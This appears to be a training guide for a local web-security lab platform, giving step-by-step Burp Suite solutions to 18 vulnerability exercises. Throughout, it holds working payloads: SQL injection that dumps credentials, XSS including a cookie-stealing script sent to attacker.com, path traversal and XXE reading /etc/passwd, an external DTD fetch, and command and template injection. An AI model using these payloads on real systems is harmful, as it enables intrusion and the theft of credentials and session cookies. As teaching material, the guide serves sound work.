# Zeroday Academy Labs - Complete Writeup and Solution Guide

## Table of Contents

### Beginner Labs
1. [SQL Injection Lab](#sql-injection-lab)
2. [Cross-Site Scripting (XSS) Lab](#cross-site-scripting-xss-lab)
3. [Authentication Bypass Lab](#authentication-bypass-lab)
4. [Sensitive Data Exposure Lab](#sensitive-data-exposure-lab)
5. [XML External Entities (XXE) Lab](#xml-external-entities-xxe-lab)
6. [Access Control Lab](#access-control-lab)
7. [Security Misconfiguration Lab](#security-misconfiguration-lab)
8. [Command Injection Lab](#command-injection-lab)
9. [Insecure Deserialization Lab](#insecure-deserialization-lab)

### Intermediate Labs
10. [Server-Side Template Injection (SSTI) Lab](#server-side-template-injection-ssti-lab)
11. [LDAP Injection Lab](#ldap-injection-lab)
12. [NoSQL Injection Lab](#nosql-injection-lab)
13. [JWT Manipulation Lab](#jwt-manipulation-lab)
14. [Advanced CSRF Lab](#advanced-csrf-lab)
15. [GraphQL Injection Lab](#graphql-injection-lab)
16. [WebSocket Manipulation Lab](#websocket-manipulation-lab)
17. [Race Condition Lab](#race-condition-lab)
18. [HTTP Host Header Injection Lab](#http-host-header-injection-lab)

---

## Lab Setup Instructions

### Prerequisites
1. **Burp Suite Professional** (or Community Edition)
2. **Web Browser** configured to use Burp proxy
3. **Zeroday Academy Platform** running locally
4. **Basic knowledge** of web application security

### Burp Suite Configuration
1. Start Burp Suite
2. Go to Proxy → Options
3. Ensure Proxy Listener is running on 127.0.0.1:8080
4. Configure your browser to use the proxy:
   - Firefox: Settings → Network Settings → Manual proxy configuration
   - Chrome: Use proxy extension or command line flags
5. Install Burp's CA certificate in your browser for HTTPS interception

---

## Beginner Labs

### SQL Injection Lab

**Lab URL:** `http://localhost:5000/api/vuln/sqli`

**Objective:** Exploit SQL injection vulnerabilities to extract sensitive data and bypass authentication.

#### Step 1: Initial Reconnaissance
1. Open Burp Suite and ensure proxy interception is ON
2. Navigate to the SQL injection lab URL
3. Observe the banking application interface with multiple tabs:
   - Basic SQLi
   - Union-Based
   - Blind SQLi
   - Auth Bypass

#### Step 2: Basic SQL Injection Discovery
1. In the "Basic SQLi" tab, enter `1` in the User ID field
2. Click "Lookup User" while Burp proxy is intercepting
3. **Burp Action:** Send the request to Repeater (Ctrl+R)
4. In Repeater, modify the `id` parameter to test for injection:
   ```
   GET /api/vuln/sqli?id=1' HTTP/1.1
   ```
5. **Expected Result:** Database error message revealing MySQL backend
6. **Screenshot Location:** Save response showing SQL error

#### Step 3: Union-Based SQL Injection
1. Switch to "Union-Based" tab in the lab
2. Intercept the search request with Burp
3. **Burp Action:** Send to Repeater and test column count:
   ```
   GET /api/vuln/sqli?search=banking' ORDER BY 1-- HTTP/1.1
   GET /api/vuln/sqli?search=banking' ORDER BY 2-- HTTP/1.1
   GET /api/vuln/sqli?search=banking' ORDER BY 3-- HTTP/1.1
   ```
4. Continue until you get an error to determine column count
5. **Union Attack:** Extract database information:
   ```
   GET /api/vuln/sqli?search=banking' UNION SELECT 1,database(),version()-- HTTP/1.1
   ```
6. **Screenshot Location:** Save response showing database name and version

#### Step 4: Data Extraction
1. **Extract table names:**
   ```
   GET /api/vuln/sqli?search=banking' UNION SELECT 1,table_name,3 FROM information_schema.tables WHERE table_schema=database()-- HTTP/1.1
   ```
2. **Extract column names from users table:**
   ```
   GET /api/vuln/sqli?search=banking' UNION SELECT 1,column_name,3 FROM information_schema.columns WHERE table_name='users'-- HTTP/1.1
   ```
3. **Extract user credentials:**
   ```
   GET /api/vuln/sqli?search=banking' UNION SELECT 1,CONCAT(username,':',password),3 FROM users-- HTTP/1.1
   ```
4. **Screenshot Location:** Save response showing extracted usernames and passwords

#### Step 5: Time-Based Blind SQL Injection
1. Switch to "Blind SQLi" tab
2. **Burp Action:** Send request to Intruder
3. Test time-based injection:
   ```
   GET /api/vuln/sqli?type=blind&input=1' AND SLEEP(5)-- HTTP/1.1
   ```
4. **Burp Observation:** Note response time delay of ~5 seconds
5. **Screenshot Location:** Save Intruder results showing timing differences

#### Step 6: Authentication Bypass
1. Switch to "Auth Bypass" tab
2. **Payload in username field:**
   ```
   admin' OR '1'='1'--
   ```
3. **Payload in password field:**
   ```
   anything
   ```
4. **Burp Action:** Intercept and observe successful authentication bypass
5. **Screenshot Location:** Save response showing successful admin access

---

### Cross-Site Scripting (XSS) Lab

**Lab URL:** `http://localhost:5000/api/vuln/xss`

**Objective:** Exploit reflected, stored, and DOM-based XSS vulnerabilities.

#### Step 1: Reflected XSS Discovery
1. Navigate to XSS lab with Burp proxy enabled
2. Test basic XSS payload in search field:
   ```
   <script>alert('XSS')</script>
   ```
3. **Burp Action:** Intercept request and send to Repeater
4. **URL-encode payload for testing:**
   ```
   GET /api/vuln/xss?search=%3Cscript%3Ealert%28%27XSS%27%29%3C%2Fscript%3E HTTP/1.1
   ```
5. **Screenshot Location:** Save response showing XSS payload execution

#### Step 2: Filter Bypass Techniques
1. **Test various payloads to bypass filters:**
   ```
   <img src=x onerror=alert('XSS')>
   <svg onload=alert('XSS')>
   <iframe src="javascript:alert('XSS')">
   ```
2. **Burp Action:** Use Intruder to test multiple payloads
3. **Screenshot Location:** Save successful bypass techniques

#### Step 3: Cookie Theft Simulation
1. **Advanced payload for cookie extraction:**
   ```
   <script>document.location='http://attacker.com/steal?cookie='+document.cookie</script>
   ```
2. **Burp Action:** Show intercepted request with cookie in URL
3. **Screenshot Location:** Save evidence of cookie theft attempt

---

### Authentication Bypass Lab

**Lab URL:** `http://localhost:5000/api/vuln/auth`

**Objective:** Bypass authentication mechanisms using various techniques.

#### Step 1: Credential Testing
1. Access the authentication lab
2. **Burp Action:** Intercept login attempts
3. **Test default credentials:**
   - admin:admin
   - admin:password
   - guest:guest
4. **Screenshot Location:** Save failed authentication responses

#### Step 2: SQL Injection in Authentication
1. **Test SQL injection in login form:**
   ```
   Username: admin' OR '1'='1'--
   Password: anything
   ```
2. **Burp Action:** Analyze response for successful bypass
3. **Screenshot Location:** Save successful authentication bypass

#### Step 3: Parameter Tampering
1. **Burp Action:** Intercept POST request and send to Repeater
2. **Add additional parameters:**
   ```
   POST /api/vuln/auth HTTP/1.1
   Content-Type: application/x-www-form-urlencoded
   
   username=admin&password=wrong&admin=true&role=administrator
   ```
3. **Screenshot Location:** Save response showing privilege escalation

---

### Sensitive Data Exposure Lab

**Lab URL:** `http://localhost:5000/api/vuln/data-exposure`

**Objective:** Discover and exploit sensitive data exposure vulnerabilities.

#### Step 1: Directory Traversal
1. **Test path traversal attacks:**
   ```
   GET /api/vuln/data-exposure?file=../../../etc/passwd HTTP/1.1
   GET /api/vuln/data-exposure?file=..%2f..%2f..%2fetc%2fpasswd HTTP/1.1
   ```
2. **Burp Action:** Use various encoding techniques
3. **Screenshot Location:** Save successful file access attempts

#### Step 2: Configuration File Access
1. **Target common configuration files:**
   ```
   GET /api/vuln/data-exposure?file=.env HTTP/1.1
   GET /api/vuln/data-exposure?file=config/database.yml HTTP/1.1
   GET /api/vuln/data-exposure?file=wp-config.php HTTP/1.1
   ```
2. **Screenshot Location:** Save exposed configuration data

---

### XML External Entities (XXE) Lab

**Lab URL:** `http://localhost:5000/api/vuln/xxe`

**Objective:** Exploit XXE vulnerabilities to read local files and perform SSRF attacks.

#### Step 1: Basic XXE File Reading
1. **Submit XML payload:**
   ```xml
   <?xml version="1.0" encoding="UTF-8"?>
   <!DOCTYPE foo [<!ENTITY xxe SYSTEM "file:///etc/passwd">]>
   <root>
   <data>&xxe;</data>
   </root>
   ```
2. **Burp Action:** Intercept and modify XML requests
3. **Screenshot Location:** Save response showing file contents

#### Step 2: Out-of-Band XXE
1. **Use external DTD for data extraction:**
   ```xml
   <?xml version="1.0" encoding="UTF-8"?>
   <!DOCTYPE foo [<!ENTITY % xxe SYSTEM "http://attacker.com/evil.dtd">%xxe;]>
   <root>
   <data>test</data>
   </root>
   ```
2. **Screenshot Location:** Save evidence of external connection

---

### Access Control Lab

**Lab URL:** `http://localhost:5000/api/vuln/access-control`

**Objective:** Exploit access control flaws including IDOR and privilege escalation.

#### Step 1: Insecure Direct Object Reference (IDOR)
1. **Test user enumeration:**
   ```
   GET /api/vuln/access-control?userId=1 HTTP/1.1
   GET /api/vuln/access-control?userId=2 HTTP/1.1
   GET /api/vuln/access-control?userId=999 HTTP/1.1
   ```
2. **Burp Action:** Use Intruder to enumerate user IDs
3. **Screenshot Location:** Save responses showing different user data

#### Step 2: Privilege Escalation
1. **Test admin panel access:**
   ```
   GET /api/vuln/access-control?action=admin HTTP/1.1
   GET /api/vuln/access-control?role=admin HTTP/1.1
   ```
2. **Screenshot Location:** Save unauthorized admin access

---

### Security Misconfiguration Lab

**Lab URL:** `http://localhost:5000/api/vuln/misconfig`

**Objective:** Identify and exploit security misconfigurations.

#### Step 1: Debug Information Exposure
1. **Enable debug mode:**
   ```
   GET /api/vuln/misconfig?debug=true HTTP/1.1
   GET /api/vuln/misconfig?debug=1 HTTP/1.1
   ```
2. **Screenshot Location:** Save debug information exposure

#### Step 2: Default Credentials
1. **Test default administrative credentials**
2. **Burp Action:** Document weak password policies
3. **Screenshot Location:** Save successful default credential access

---

### Command Injection Lab

**Lab URL:** `http://localhost:5000/api/vuln/command`

**Objective:** Exploit command injection vulnerabilities for remote code execution.

#### Step 1: Basic Command Injection
1. **Test command injection in ping utility:**
   ```
   POST /api/vuln/command HTTP/1.1
   Content-Type: application/x-www-form-urlencoded
   
   ping=127.0.0.1; ls -la
   ```
2. **Burp Action:** Test various command separators (;, &&, ||, |)
3. **Screenshot Location:** Save command execution results

#### Step 2: Filter Bypass
1. **Test bypass techniques:**
   ```
   ping=127.0.0.1$(cat /etc/passwd)
   ping=127.0.0.1`whoami`
   ping=127.0.0.1%0Als%20-la
   ```
2. **Screenshot Location:** Save successful bypass attempts

---

### Insecure Deserialization Lab

**Lab URL:** `http://localhost:5000/api/vuln/deserialize`

**Objective:** Exploit insecure deserialization for remote code execution.

#### Step 1: Object Injection
1. **Test malicious serialized objects:**
   ```json
   {"cmd": "ls -la"}
   {"constructor": {"name": "Function"}, "code": "return process.env"}
   ```
2. **Burp Action:** Base64 encode payloads for testing
3. **Screenshot Location:** Save code execution evidence

---

## Intermediate Labs

### Server-Side Template Injection (SSTI) Lab

**Lab URL:** `http://localhost:5000/api/vuln/ssti`

**Objective:** Exploit SSTI vulnerabilities for remote code execution.

#### Step 1: Template Engine Detection
1. **Test basic SSTI payloads:**
   ```
   {{7*7}}
   ${7*7}
   #{7*7}
   ```
2. **Screenshot Location:** Save response showing mathematical evaluation

#### Step 2: Code Execution
1. **Node.js SSTI payload:**
   ```
   {{constructor.constructor('return process.env')()}}
   ```
2. **Screenshot Location:** Save environment variable exposure

---

### LDAP Injection Lab

**Lab URL:** `http://localhost:5000/api/vuln/ldap-injection`

**Objective:** Exploit LDAP injection vulnerabilities.

#### Step 1: Authentication Bypass
1. **LDAP injection payloads:**
   ```
   *)(uid=*))(|(uid=*
   admin)(&(password=*))
   ```
2. **Screenshot Location:** Save authentication bypass evidence

---

### NoSQL Injection Lab

**Lab URL:** `http://localhost:5000/api/vuln/nosql-injection`

**Objective:** Exploit NoSQL injection in MongoDB-style queries.

#### Step 1: Authentication Bypass
1. **NoSQL injection payloads:**
   ```
   {"$or": [{"username": "admin"}, {"username": {"$ne": ""}}]}
   {"username": {"$regex": ".*"}, "password": {"$ne": ""}}
   ```
2. **Screenshot Location:** Save successful bypass

---

### JWT Manipulation Lab

**Lab URL:** `http://localhost:5000/api/vuln/jwt-manipulation`

**Objective:** Exploit JWT vulnerabilities including algorithm confusion and weak secrets.

#### Step 1: Algorithm Confusion
1. **Change RS256 to HS256 in JWT header**
2. **Use public key as HMAC secret**
3. **Screenshot Location:** Save successful token manipulation

---

### Advanced CSRF Lab

**Lab URL:** `http://localhost:5000/api/vuln/csrf-advanced`

**Objective:** Exploit advanced CSRF vulnerabilities with SameSite bypass.

#### Step 1: Token Bypass
1. **Create malicious HTML page with CSRF payload**
2. **Test SameSite cookie bypass techniques**
3. **Screenshot Location:** Save successful CSRF execution

---

### GraphQL Injection Lab

**Lab URL:** `http://localhost:5000/api/vuln/graphql-injection`

**Objective:** Exploit GraphQL injection and introspection vulnerabilities.

#### Step 1: Schema Introspection
1. **GraphQL introspection query:**
   ```graphql
   query IntrospectionQuery {
     __schema {
       queryType { name }
       mutationType { name }
       types {
         name
         fields {
           name
           type { name }
         }
       }
     }
   }
   ```
2. **Screenshot Location:** Save schema information

---

### WebSocket Manipulation Lab

**Lab URL:** `http://localhost:5000/api/vuln/websocket-manipulation`

**Objective:** Exploit WebSocket vulnerabilities through message manipulation.

#### Step 1: Message Interception
1. **Use Burp to intercept WebSocket traffic**
2. **Modify messages in real-time**
3. **Screenshot Location:** Save manipulated WebSocket messages

---

### Race Condition Lab

**Lab URL:** `http://localhost:5000/api/vuln/race-condition`

**Objective:** Exploit race condition vulnerabilities in concurrent requests.

#### Step 1: Concurrent Request Testing
1. **Use Burp Turbo Intruder for simultaneous requests**
2. **Target balance transfer or similar operations**
3. **Screenshot Location:** Save evidence of race condition exploitation

---

### HTTP Host Header Injection Lab

**Lab URL:** `http://localhost:5000/api/vuln/host-header-injection`

**Objective:** Exploit Host header injection for cache poisoning and password reset attacks.

#### Step 1: Header Manipulation
1. **Modify Host header:**
   ```
   Host: evil.com
   X-Forwarded-Host: evil.com
   X-Host: evil.com
   ```
2. **Screenshot Location:** Save successful header injection

---

## General Burp Suite Tips for All Labs

### 1. Proxy Configuration
- Always ensure proxy interception is enabled
- Use "Intercept is on" for real-time request modification
- Save interesting requests to Project files

### 2. Essential Burp Tools Usage

#### Repeater Tab
- Send interesting requests to Repeater (Ctrl+R)
- Modify parameters and headers manually
- Test various payloads systematically

#### Intruder Tab
- Use for automated payload testing
- Configure attack types: Sniper, Battering Ram, Pitchfork, Cluster Bomb
- Load wordlists for comprehensive testing

#### Scanner Tab (Pro Version)
- Run automated vulnerability scans
- Review detailed vulnerability reports
- Validate manual findings

#### Target Tab
- Map application structure
- Identify all endpoints and parameters
- Use site map for comprehensive testing

### 3. Request/Response Analysis
- Always review HTTP headers carefully
- Look for error messages that reveal system information
- Note unusual response times (potential for blind attacks)
- Check for reflected user input in responses

### 4. Session Management
- Test session token randomness
- Check for session fixation vulnerabilities
- Verify proper session termination

### 5. Documentation Best Practices
- Take screenshots of all successful exploits
- Document exact payloads used
- Note response codes and error messages
- Record timing information for blind attacks

---

## Conclusion

This comprehensive writeup covers all 18 labs in the Zeroday Academy platform. Each lab is designed to teach specific vulnerability classes and exploitation techniques. Practice these exercises in the controlled environment to build your penetration testing skills.

Remember to:
1. Always use Burp Suite systematically
2. Document your findings thoroughly
3. Understand the underlying vulnerability principles
4. Practice responsible disclosure in real-world scenarios

For questions or additional guidance, refer to the OWASP Testing Guide and web application security documentation.

---

**Lab Platform:** Zeroday Academy  
**Version:** 1.0  
**Last Updated:** January 2025  
**Author:** Security Research Team